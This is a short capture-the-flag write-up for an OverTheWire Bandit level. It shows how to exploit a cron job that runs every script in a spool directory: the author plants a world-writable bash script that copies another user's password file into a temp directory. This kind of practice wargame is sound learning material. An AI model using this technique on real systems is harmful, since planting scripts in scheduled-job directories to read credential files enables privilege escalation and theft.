A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

In this level we have to look up the script that is running on cronjob_bandit24 and we can see that it is executing all scripts in the /var/spool/bandit24/foo/ directory
from there we can create our own script to fetch the password from /etc/bandit_pass/bandit24 and skip to the next level
DONT FORGET TO GIVE PERMS! LOL


cat /etc/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

mktemp -d
chmod 777 /tmp/tmp.VbSB9lB4F3/

vim /var/spool/bandit24/foo/password.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.VbSB9lB4F3/password

chmod 777 /var/spool/bandit24/foo/password.sh

cat /tmp/tmp.VbSB9lB4F3/password
